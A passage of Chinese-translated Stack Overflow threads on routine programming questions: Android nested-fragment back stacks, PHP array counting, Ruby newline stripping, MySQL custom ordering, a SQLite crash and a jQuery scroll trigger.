    private NestedFragment mParentFragment;

    @Override
    public void onAttach(Context context) {
        super.onAttach(context);

        if (getParentFragment() == null) {
            try {
                mParentActivity = (NestedFragmentActivity) context;
            } catch (ClassCastException e) {
                throw new ClassCastException(context.toString()
                        + " must implement " + NestedFragmentActivity.class.getName());
            }
        } else {
            try {
                mParentFragment = (NestedFragment) getParentFragment();
            } catch (ClassCastException e) {
                throw new ClassCastException(getParentFragment().getClass().toString()
                        + " must implement " + NestedFragment.class.getName());
            }
        }
    }

    public void onBackPressed() {

        if (mActiveFragmentIdStack.size() > 0 && mActiveFragmentTagStack.size() > 0) {

            // Find by id
            int lastFragmentId = mActiveFragmentIdStack.lastElement();
            NestedFragment nestedFragment = (NestedFragment) getChildFragmentManager().findFragmentById(lastFragmentId);

            // If cannot find by id, find by tag
            if (nestedFragment == null) {
                String lastFragmentTag = mActiveFragmentTagStack.lastElement();
                nestedFragment = (NestedFragment) getChildFragmentManager().findFragmentByTag(lastFragmentTag);
            }

            if (nestedFragment != null) {
                nestedFragment.onBackPressed();
            }

            // If cannot find by tag, then simply pop
            mActiveFragmentIdStack.pop();
            mActiveFragmentTagStack.pop();

        } else {
            getChildFragmentManager().popBackStack();
        }
    }

    private void addToBackStack(int fragmentId, String fragmentTag) {
        mActiveFragmentIdStack.add(fragmentId);
        mActiveFragmentTagStack.add(fragmentTag);
    }

    public void addToParentBackStack() {
        if (mParentFragment != null) {
            mParentFragment.addToBackStack(getId(), getTag());
        } else if (mParentActivity != null) {
            mParentActivity.addToBackStack(getId(), getTag());
        }
    }
} 
```

**解释：**

从上述类扩展的每个活动和片段都为他们的每个孩子和孩子的孩子管理自己的后台堆栈，等等。后台堆栈只是“活动片段”标签/ID 的记录。因此需要注意的是始终为您的片段提供标签和/或 ID。

在 childFragmentManager 中添加到 backstack 时，您还需要调用“addToParentBackStack()”。这确保片段的标签/id 被添加到父片段/活动中以供以后弹出。

例子：

```
 getChildFragmentManager().beginTransaction().replace(
            R.id.fragment,
            fragment,
            fragment.getTag()
    ).addToBackStack(null).commit();
    addToParentBackStack(); 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-05-04T08:27:22.190

这个解决方案可能更好，因为它检查嵌套片段的所有级别：

```
 /**
 * This method will go check all the back stacks of the added fragments and their nested fragments
 * to the the {@code FragmentManager} passed as parameter.
 * If there is a fragment and the back stack of this fragment is not empty,
 * then emulate 'onBackPressed' behaviour, because in default, it is not working.
 *
 * @param fm the fragment manager to which we will try to dispatch the back pressed event.
 * @return {@code true} if the onBackPressed event was consumed by a child fragment, otherwise {@code false}.
 */
public static boolean dispatchOnBackPressedToFragments(FragmentManager fm) {

    List<Fragment> fragments = fm.getFragments();
    boolean result;
    if (fragments != null && !fragments.isEmpty()) {
        for (Fragment frag : fragments) {
            if (frag != null && frag.isAdded() && frag.getChildFragmentManager() != null) {
                // go to the next level of child fragments.
                result = dispatchOnBackPressedToFragments(frag.getChildFragmentManager());
                if (result) return true;
            }
        }
    }

    // if the back stack is not empty then we pop the last transaction.
    if (fm.getBackStackEntryCount() > 0) {
        fm.popBackStack();
        fm.executePendingTransactions();
        return true;
    }

    return false;
} 
```

在您的活动中`onBackPressed`，您可以简单地这样称呼它：

```
FragmentManager fm = getSupportFragmentManager();
                // if there is a fragment and the back stack of this fragment is not empty,
                // then emulate 'onBackPressed' behaviour, because in default, it is not working
                if (!dispatchOnBackPressedToFragments(fm)) {
                    // if no child fragment consumed the onBackPressed event,
                    // we execute the default behaviour.
                    super.onBackPressed();
                } 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2016-09-16T05:12:45.133

感谢大家的帮助，这个（调整后的版本）对我有用：

```
@Override
public void onBackPressed() {
    if (!recursivePopBackStack(getSupportFragmentManager())) {
        super.onBackPressed();
    }
}

/**
 * Recursively look through nested fragments for a backstack entry to pop
 * @return: true if a pop was performed
 */
public static boolean recursivePopBackStack(FragmentManager fragmentManager) {
    if (fragmentManager.getFragments() != null) {
        for (Fragment fragment : fragmentManager.getFragments()) {
            if (fragment != null && fragment.isVisible()) {
                boolean popped = recursivePopBackStack(fragment.getChildFragmentManager());
                if (popped) {
                    return true;
                }
            }
        }
    }

    if (fragmentManager.getBackStackEntryCount() > 0) {
        fragmentManager.popBackStack();
        return true;
    }

    return false;
} 
```

注意：您可能还希望将这些嵌套片段的背景颜色设置为应用程序主题的窗口背景颜色，因为默认情况下它们是透明的。有点超出了这个问题的范围，但它是通过解析属性 android.R.attr.windowBackground 并将 Fragment 视图的背景设置为该资源 ID 来完成的。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-07-30T08:40:17.093

在观察了这里提出的一些解决方案之后，我发现为了让父片段在弹出堆栈或何时应该忽略返回操作时具有灵活性和控制，我宁愿使用这样的实现：

定义一个“ParentFragment”接口：

```
interface ParentFragment {
/**
 * Fragments that host child fragments and want to control their BackStack behaviour when the back button is pressed should implement this
 *
 * @return true if back press was handled, false otherwise
 */
fun onBackPressed(): Boolean 
```

}

覆盖父活动（或BaseActivity）中的“onBackPressed”：

```
override fun onBackPressed() {
    val fm: FragmentManager = supportFragmentManager
    for (frag in fm.fragments) {
        if (frag.isVisible && frag is ParentFragment && frag.onBackPressed()) {
            return
        }
    }
    super.onBackPressed()
} 
```

然后让父片段随心所欲地处理，例如：

```
override fun onBackPressed(): Boolean {
    val childFragment = childFragmentManager.findFragmentByTag(SomeChildFragment::class.java.simpleName)
    if (childFragment != null && childFragment.isVisible) {
        // Only for that case, pop the BackStack (perhaps when other child fragments are visible don't)
        childFragmentManager.popBackStack()
        return true
    }
    return false
} 
```

这可以避免在使用视图寻呼机时认为有一些合法的子片段要删除（并且返回堆栈条目计数> 0）。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-09-29T16:57:28.533

这是我的解决方案。我有一个带有子片段的活动。然后，该子片段可以递归地在其 childFragmentManager 上创建自身的更多版本。所以这是我的活动的 onBackPressed 函数的代码。

```
override fun onBackPressed() {
    // Get the child fragment manager of the displayed fragment
    var childFragmentManager = supportFragmentManager.fragments.first().childFragmentManager

    // If there are nested fragments, handle those first
    if (childFragmentManager.backStackEntryCount > 0) {
        // If there are more nested fragments, go deeper into those
        var nestedChildFragmentManager = childFragmentManager.fragments.first().childFragmentManager
        while (nestedChildFragmentManager.backStackEntryCount > 0) {
            childFragmentManager = nestedChildFragmentManager
            nestedChildFragmentManager = childFragmentManager.fragments.first().childFragmentManager
        }

        // Dismiss the innermost nested fragment
        childFragmentManager.popBackStack()
    } else if (supportFragmentManager.backStackEntryCount > 0) {
        // If there are no nested fragments, dismiss the original fragment
        supportFragmentManager.popBackStack()
    } else {
        // Otherwise, handle the back press as normal
        super.onBackPressed()
    }
} 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2020-02-12T17:33:56.873

我通过将当前打开的片段保留在活动属性中来解决了这个问题。然后我覆盖方法

> ```
>  // INSIDE ACTIVITY
>  override fun onBackPressed() {
>     val fragment = currentFragment
> 
>     if(fragment != null && fragment.childFragmentManager.fragments.any()){
>         fragment.childFragmentManager.popBackStack()
>     }
>     else {
>         super.onBackPressed()
>     }
> } 
> ```

这就是我从自身内部将子片段添加到当前打开的片段中的方式。

> ```
>  // INSIDE FRAGMENT
>  menu_fragment_view.setBackgroundColor(-((Math.random() * 10000 ).toInt() % 30000)) // to see change
>  add_fragment_button.setOnClickListener {
>         val transaction = childFragmentManager.beginTransaction()
> 
>         transaction.add(R.id.menu_fragment_fragment_holder, MenuFragment())
> 
>         transaction.addToBackStack(null)
> 
>         transaction.commit()
>     } 
> ```

这是父片段和添加片段的xml布局

> ```
>  <?xml version="1.0" encoding="utf-8"?>
>  <androidx.constraintlayout.widget.ConstraintLayout
>      xmlns:android="http://schemas.android.com/apk/res/android"
>      xmlns:app="http://schemas.android.com/apk/res-auto"
>      android:layout_width="match_parent"
>      android:layout_height="match_parent"
>      android:id="@+id/menu_fragment_view">
>      <Button
>          app:layout_constraintTop_toTopOf="parent"
>          app:layout_constraintLeft_toLeftOf="parent"
>          android:layout_width="wrap_content"
>          android:layout_height="wrap_content"
>          android:id="@+id/add_fragment_button"
>          android:text="Just add fragment"/>
>      <FrameLayout
>          android:id="@+id/menu_fragment_fragment_holder"
>          android:layout_width="match_parent"
>          android:layout_height="match_parent"
>          app:layout_constraintTop_toTopOf="parent"
>          app:layout_constraintLeft_toLeftOf="parent"/> 
> </androidx.constraintlayout.widget.ConstraintLayout> 
> ```

* * *

## 回答 #17

> 赞同：-1
> 
> 时间：2015-02-26T17:09:54.133

对于 ChildFragments 这有效..

```
@Override
    public void onBackPressed() {

 if (getSupportFragmentManager().getBackStackEntryCount() > 0) {
            getSupportFragmentManager().popBackStack();
        } else {
            doExit(); //super.onBackPressed();
        }
} 
```

* * *

## 回答 #18

> 赞同：-1
> 
> 时间：2013-11-15T17:05:55.493

如果您有一个`DialogFragment`which 又嵌套了片段，则“解决方法”会有所不同。而不是设置`onKeyListener`到`rootView`，您需要使用`Dialog`. 此外，您将设置一个`DialogInterface.OnKeyListener`而不是那个`View`。当然，记住`addToBackStack`！

> 顺便说一句，在后台有 1 个片段用于将回调委托给活动是我的个人用例。典型情况可能是计数为 0。

这是您必须在 onCreateDialog 中执行的操作

```
 @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        Dialog dialog =  super.onCreateDialog(savedInstanceState);
        dialog.setOnKeyListener(new DialogInterface.OnKeyListener() {
            @Override
            public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
                if(keyCode == KeyEvent.KEYCODE_BACK){
                    FragmentManager cfm = getChildFragmentManager();
                    if(cfm.getBackStackEntryCount()>1){
                        cfm.popBackStack();
                        return true;
                    }   
                }   
                return false;
            }
        });
        return dialog;
    } 
```

# php - 在多维数组中计数

> ID：13418440
> 
> 赞同：0
> 
> 时间：2012-11-16T14:20:26.657
> 
> 标签：php, arrays, multidimensional-array, counting

我有一个像这样的数组：

```
$resellers =  Array
(
    [40] => Array
        (
            [state] => AB
            [city] => Calgary
        )

    [185] => Array
        (
            [state] => AB
            [city] => Calgary
        )

    [141] => Array
        (
            [state] => AB
            [city] => Calgary
        )

    [41] => Array
        (
            [state] => AB
            [city] => Grande Prairie
        )

    [68] => Array
        (
            [state] => BC
            [city] => Burnaby
        )

    [51] => Array
        (
            [state] => BC
            [city] => Campbell River
        )

    [61] => Array
        (
            [state] => BC
            [city] => Kamloops
        )
  ) 
```

我想知道是否有一种简单的方法可以计算“阿尔伯塔”（即 4）和 BC（即 3）的值。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-16T14:26:09.233

```
array_count_values(array_map(function($item) {
   return $item['state'];
}, $resellers)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:28:57.100

只需遍历它即可找到您需要的状态。

```
function countState($data, $state) {
    $i = 0;
    foreach($data as $point)
        if($point['state'] === $state)
            $i++;

    return $i;
}

echo "Alberta found " . countState($array, "AB") . " times"! 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:23:56.823

尝试：

```
$arr = array(array('state'=>'AB', 'city'=>'Calgary'), ...); //your array 

function count_values( $arr, $value) {
 $count = 0;
 foreach($arr as $v) {
  foreach($v as $m) {
   if( $m['state'] === $value )
    $count++;
  }
 }
 return $count;
}

$count_ab = count_values($arr, 'AB');
$count_bc = count_values($arr, 'BC'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:52:14.333

在 Cedrun 的回应的帮助下解决了。

内置数组：

```
 $state_count = array_count_values( array_map(function($item){return $item['state'];}, $r_resellers)); 
```

然后输出：

```
echo $state_count["AB"]; 
```

# android - 处理-Android模式错误

> ID：13418444
> 
> 赞同：0
> 
> 时间：2012-11-16T14:20:33.300
> 
> 标签：android, processing

我正在使用 Ubuntu 12.04，处理 2.06b，在 Android 模式下，我可以在 java 模式下完美运行代码，但是在 android 模式下运行类似代码时，出现以下错误（第一次我也给出了 android sdk 的路径）

```
Android SDK Tools Revision 20.0.3
Installed at /home/trendwise/android-sdk-linux
Project Type: Application

BUILD FAILED
/home/trendwise/android-sdk-linux/tools/ant/build.xml:517: Unable to resolve project target 'android-10'

Total time: 2 seconds 
```

这个错误是什么意思？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-29T15:16:47.797

最终我通过广泛的谷歌搜索解决了这个问题。

当您的机器上没有安装正确的**Android SDK API**时，就会发生这种情况，例如。**安卓 2.3.3（API 10）**。

当您在设备上运行项目/脚本时，该项目首先使用 SDK 构建，然后在连接的设备上运行。

要解决此问题，请下载相应的**Android SDK API**和**Google API**。

此处更详细地解释了同样的问题：[https ://github.com/processing/processing-android/issues/47](https://github.com/processing/processing-android/issues/47)

# java - 如何在 Java 语言解析器中正确标记“@”符号？

> ID：13418445
> 
> 赞同：3
> 
> 时间：2012-11-16T14:20:34.350
> 
> 标签：java, parsing, grammar, token, language-details

我正在开发一个 Java 源代码解析器，遵循[词法](http://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html)和[句法](http://docs.oracle.com/javase/specs/jls/se7/html/jls-18.html)规范。

不过，我被困在注释上；相关规则是：

```
Annotation:
    @ QualifiedIdentifier [ ( [AnnotationElement] ) ]

AnnotationTypeDeclaration:
    @ interface Identifier AnnotationTypeBody 
```

`@`但我在词汇规范中的任何地方都没有看到提到的符号。标记化的正确规则是什么`@`，或者我在哪里可以找到这样的规则？

我意识到我可以很容易地为此添加一个令牌定义，它甚至可能会起作用——有时。但如果可能的话，我更愿意根据规范正确地做到这一点。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T14:27:54.953

在[9.6 中。注释类型](http://docs.oracle.com/javase/specs/jls/se7/html/jls-9.html#jls-9.6)，它说：

> *请注意，at 符号 (@) 和关键字接口是两个不同的标记。从技术上讲，可以用空格将它们分开，但出于风格问题，不鼓励这样做。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:33:11.007

您是对的，因为在 JLS 的“3\. Lexical Structure”部分中没有将“@”作为运算符或标点符号提及。

但是，它在 JLS 9.6 和“18\. Collected Syntax”部分中用作符号，因此很明显您的词法分析器应将其视为一个符号。

这只是一个次要的编辑问题，在实现 Java 解析器时不会引起您的任何担忧。

# ruby - 如何从Ruby中的字符串末尾删除多个\ n

> ID：13418446
> 
> 赞同：1
> 
> 时间：2012-11-16T14:20:37.967
> 
> 标签：ruby

我曾经从一个字符串`chomp`中删除多个`"\n"`，但它只删除一个。如何`"\n"`从字符串中删除多个字符？

我的字符串看起来像：

```
"Ttyyuhhhjhhhh\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-16T14:23:54.277

该方法[`strip`](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-strip)将为您删除**所有前导和尾随空格**。

如果您只想`\n`从字符串末尾删除 ，则可以使用正则表达式，例如：

```
string.gsub!(/(\n*)$/, '') 
```

或者[`rstrip!`](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-rstrip)

```
string.rstrip! 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-16T14:27:45.220

由于您需要从字符串的末尾剥离，请使用[`rstrip`](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-rstrip)

```
str = "Ttyyuhhhjhhhh\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
str.rstrip() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-02-07T23:25:37.857

如果您真的只想删除换行符，而不是其他空格，`strip`并且`rstrip`（删除所有空格）不是答案。正则表达式`/\n+\Z/`将匹配字符串末尾的任意数量的换行符：

```
str1 = "text \t\n\n\n"
# => "text \t\n\n\n"
str1.sub(/\n+\Z/, '')
# => "text \t" 
```

请注意，这也适用于多行字符串（并且**没有**多行正则表达式修饰符），而字符串中间的换行符保持不变：`/m`

```
str2 = str1 + str1 + str1
# => "text \t\n\n\ntext \t\n\n\ntext \t\n\n\n"
str2.sub(/\n+\Z/, '')
# => "text \t\n\n\ntext \t\n\n\ntext \t" 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-11-16T14:25:37.050

```
"Ttyyuhhhjhhhh\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n".gsub(/\n$/,'') 
```

# iphone - 通过 wifi 或游戏中心进行多人游戏的 iPhone 纸牌游戏？

> ID：13418447
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:20:51.180
> 
> 标签：iphone, ios, multiplayer

我从为 iOS 创建纸牌游戏开始，我很感兴趣是否可以通过 GameCenter 或仅通过 WiFi 创建多人游戏？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:34:38.457

Game Center 是 Apple 提供的用于连接玩家的界面。Wi-fi 是一种互联网连接方式。*您可以通过*Game Center使用 Wi-Fi 连接到世界任何地方的其他玩家。

如果您正在寻找有关如何*使用*Game Center 创建游戏的信息，我会查看 [http://www.raywenderlich.com/3276/how-to-make-a-simple-multiplayer-game-with-game-中心教程第 12 部分](http://www.raywenderlich.com/3276/how-to-make-a-simple-multiplayer-game-with-game-center-tutorial-part-12)。

如果您需要有关如何创建多人纸牌游戏的信息，我会查看[http://www.raywenderlich.com/14618/how-to-make-a-simple-playing-card-game-with-multiplayer-and -蓝牙介绍和挑战](http://www.raywenderlich.com/14618/how-to-make-a-simple-playing-card-game-with-multiplayer-and-bluetooth-intro-and-challenge)

# android - 为什么 R.Java 文件的徽标已更改，现在无法识别布局的 ID？

> ID：13418451
> 
> 赞同：0
> 
> 时间：2012-11-16T14:20:56.667
> 
> 标签：android, r.java-file

我已经尝试了一切来清理项目，但是对布局的引用也存在于 R.java 文件中，但它们无法识别，而且奇怪的是 R.java 的标志已经改变，我附上了下面的图片。

如果有人可以帮助我，我将不胜感激。

提前谢谢了 ：-） ![在此处输入图像描述](../Images/d99a0a2bbdc993e1f3d5a522ec4be080.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:32:34.147

空心 J 似乎意味着您的文件被排除在构建路径之外。 [Eclipse 自动完成功能在某些 Java 文件中不起作用](https://stackoverflow.com/questions/2390371/eclipse-autocomplete-not-working-in-some-java-files) 检查是否是。

您也可以尝试彻底删除 R.java，反正它是自动生成的，所以它会回来。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:27:45.347

1) 确保您的 XML 布局没有问题（问题视图）。

2) 删除项目中的**/bin**和**/gen**文件夹，然后为您的项目运行**Project** -> **Clean** ->。

# mysql - mysql按顺序获取某些行

> ID：13418454
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:21:04.783
> 
> 标签：mysql, sql

如何按顺序从表中获取某些行？例如，我有以下行：

```
EmpID   Name
81      Albert
22      Ashley
71      John
42      Jack
55      Bob 
```

主键是 EmpID。我只想得到：John、Albert、Bob IN ORDER。结果应该是：

```
71      John
81      Albert
55      Bob 
```

如何使用 MySQL 查询来做到这一点？多谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:22:32.913

试试这个，它使用*自定义排序*

```
SELECT *
FROM TABLENAME
WHERE EmpID IN (72,81,55)
ORDER BY FIELD(NAME, 'John', 'Albert', 'Bob') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:29:55.020

将其放在 SQL 语句的末尾：

```
ORDER BY CASE EmpID
    WHEN 71 THEN 1  
    WHEN 81 THEN 2  
    WHEN 55 THEN 3  
    ELSE 4
END 
```

# android - SQLite：库例程调用乱序 - 如何解决此崩溃？

> ID：13418455
> 
> 赞同：4
> 
> 时间：2012-11-16T14:21:14.440
> 
> 标签：android, sqlite, android-sqlite

好的，所以我的应用程序在 Android 2.3 上完美运行，**在 4.0.4 上崩溃。**

我正在解析 XML 并将**数据保存到我的 SQLite 数据库。**

这不是每次都会发生**，但确实经常**发生，有时在按钮点击时有时在新的 Activity 启动时......等等

崩溃异常：

```
11-16 15:16:41.231: E/SQLiteQuery(6398): exception: library routine called out of sequence; query: SELECT _id, name, tipus, azonosito, gpsx, gpsy, pictures, telefonok, webcim, email, nyitvatartas, cim, orszag, befogadokepesseg, szolgaltatasok, arkategoria, leiras, ertekeles, pontszam, facebook, keywords, rating FROM shops_top20

11-16 15:16:41.241: E/AndroidRuntime(6398): FATAL EXCEPTION: main
11-16 15:16:41.241: E/AndroidRuntime(6398): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.KeySoft.OpenGuide/com.KeySoft.OpenGuide.Activities.Top20}: android.database.sqlite.SQLiteMisuseException: library routine called out of sequence
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1968)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1993)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread.access$600(ActivityThread.java:127)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1159)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.os.Handler.dispatchMessage(Handler.java:99)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.os.Looper.loop(Looper.java:137)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread.main(ActivityThread.java:4507)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at java.lang.reflect.Method.invokeNative(Native Method)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at java.lang.reflect.Method.invoke(Method.java:511)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:978)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:745)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at dalvik.system.NativeStart.main(Native Method)
11-16 15:16:41.241: E/AndroidRuntime(6398): Caused by: android.database.sqlite.SQLiteMisuseException: library routine called out of sequence
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.sqlite.SQLiteQuery.nativeFillWindow(Native Method)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.sqlite.SQLiteQuery.fillWindow(SQLiteQuery.java:86)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.sqlite.SQLiteCursor.fillWindow(SQLiteCursor.java:164)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.sqlite.SQLiteCursor.getCount(SQLiteCursor.java:156)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.AbstractCursor.moveToPosition(AbstractCursor.java:161)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.database.AbstractCursor.moveToFirst(AbstractCursor.java:201)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at com.KeySoft.OpenGuide.Activities.Top20.SqlShopsVissza(Top20.java:546)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at com.KeySoft.OpenGuide.Activities.Top20.listakKirajzolasaEsValtas(Top20.java:165)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at com.KeySoft.OpenGuide.Activities.Top20.onCreate(Top20.java:113)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.Activity.performCreate(Activity.java:4469)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
11-16 15:16:41.241: E/AndroidRuntime(6398):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1932) 
```

**编辑：好的，所以我在关闭应用程序中的所有数据库连接之前关闭了所有游标，现在我得到了这个例外：**

```
 11-16 20:00:28.409: E/AndroidRuntime(7548): FATAL EXCEPTION: main
11-16 20:00:28.409: E/AndroidRuntime(7548): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.KeySoft.OpenGuide/com.KeySoft.OpenGuide.Activities.Top20}: java.util.ConcurrentModificationException
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1968)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1993)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread.access$600(ActivityThread.java:127)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1159)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.os.Handler.dispatchMessage(Handler.java:99)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.os.Looper.loop(Looper.java:137)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread.main(ActivityThread.java:4507)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at java.lang.reflect.Method.invokeNative(Native Method)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at java.lang.reflect.Method.invoke(Method.java:511)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:978)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:745)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at dalvik.system.NativeStart.main(Native Method)
11-16 20:00:28.409: E/AndroidRuntime(7548): Caused by: java.util.ConcurrentModificationException
11-16 20:00:28.409: E/AndroidRuntime(7548):     at java.util.WeakHashMap$HashIterator.next(WeakHashMap.java:165)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.database.sqlite.SQLiteDatabase.closeClosable(SQLiteDatabase.java:1250)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.database.sqlite.SQLiteDatabase.close(SQLiteDatabase.java:1220)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.database.sqlite.SQLiteOpenHelper.close(SQLiteOpenHelper.java:265)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.KeySoft.OpenGuide.DB_Adapter.close(DB_Adapter.java:273)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.KeySoft.OpenGuide.Activities.Top20.SqlShopsVissza(Top20.java:558)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.KeySoft.OpenGuide.Activities.Top20.listakKirajzolasaEsValtas(Top20.java:165)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at com.KeySoft.OpenGuide.Activities.Top20.onCreate(Top20.java:113)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.Activity.performCreate(Activity.java:4469)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
11-16 20:00:28.409: E/AndroidRuntime(7548):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1932) 
```

**我的代码中有问题的部分是我的 Top20 Activity 中的一个函数，目前是以下函数：**

```
protected void getShopsFromSql(String whichTable){

            db.open();
            Cursor c;

            if(whichTable.equals("Top20")){
                c = db.getAllTop20Titles();
            }
            else if (whichTable.equals("Latest10")){
                c = db.getAllLatest10Titles();
            }
            else{
                c = db.getAllShopsFullTitles();
            }

                if (c.moveToFirst())  {
                    do  {

                        addShopToList(c.getString(1), c.getString(2), c.getString(4), c.getString(5), c.getString(12), c.getString(11), c.getString(3));
                    }while (c.moveToNext());
                }

                c.close(); 
                db.close(); //App Crashes here... why?
        } 
```

db 肯定是我的数据库，我用谷歌搜索了这个错误，当然，当我想在一个线程上编辑一个值并通过另一个线程（这次是后台 AsyncTask）迭代相同的值时会发生这种情况，但我有一个单例数据库适配器我在堆栈中读到这种数据库实现最适合 Android 应用程序。

我有一个带有单个数据库的扩展应用程序类，我每次都调用这个数据库。

```
public class MyApp extends Application {

 private static DB_Adapter globalDatabase;

    @Override
    public void onCreate() {
        super.onCreate();

        globalDatabase = new DB_Adapter(this);
    }

    public static DB_Adapter getDB() {

        return globalDatabase;
    } 
```

}

在我的应用程序中引用数据库，如下所示：

```
public class Top20 extends Activity 
{

    private DB_Adapter db;
    private MyApp myApp;

    @Override
    public void onCreate(Bundle savedInstanceState){

        super.onCreate(savedInstanceState);
        setContentView(R.layout.top20);

        myApp = (MyApp) getApplication();

        db = myApp.getDB();

                    //...........morecode...etc.. 
```

所以：

我的问题是：

为什么会出现这个错误？我做对了这个单例数据库实现吗？

谢谢你的建议，亚当

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-01-07T23:04:11.130

你似乎得到了，`ConcurrentModificationException`因为你试图关闭数据库，因为其他线程试图访问它。没有看到你的代码的其余部分，我不确定你有哪些其他线程访问数据库，所以很难知道还有什么事情发生。

顺便说一句，可能是更好的解决方案，您是否有理由尝试关闭它？正如 Google FW 工程师 Dianne Hackborn 所说，您不需要关闭数据库，因为一旦您的进程被终止，它将自动关闭。有关她对此发表评论的多个帖子，请参阅[链接 #1](https://groups.google.com/forum/#!msg/android-developers/NwDRpHUXt0U/jIam4Q8-cqQJ)和[链接 #2](https://groups.google.com/forum/#!topic/android-developers/DAkbe6rzxXY)。

# jquery - 在身体高度的 X% 之后显示 div

> ID：13418456
> 
> 赞同：0
> 
> 时间：2012-11-16T14:21:19.430
> 
> 标签：jquery, if-statement, height

在滚动了 300px 的页面高度后，如何调用 div 以将其显示在顶部（搜索栏和一些功能）？

我想要实现的是，当用户滚动时，在某个点显示另一个包含一些工具的 div。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:26:02.713

可能这就是你要找的东西：

**JavaScript**

```
$(document).ready(function () {
  $('#my-div').hide();
});
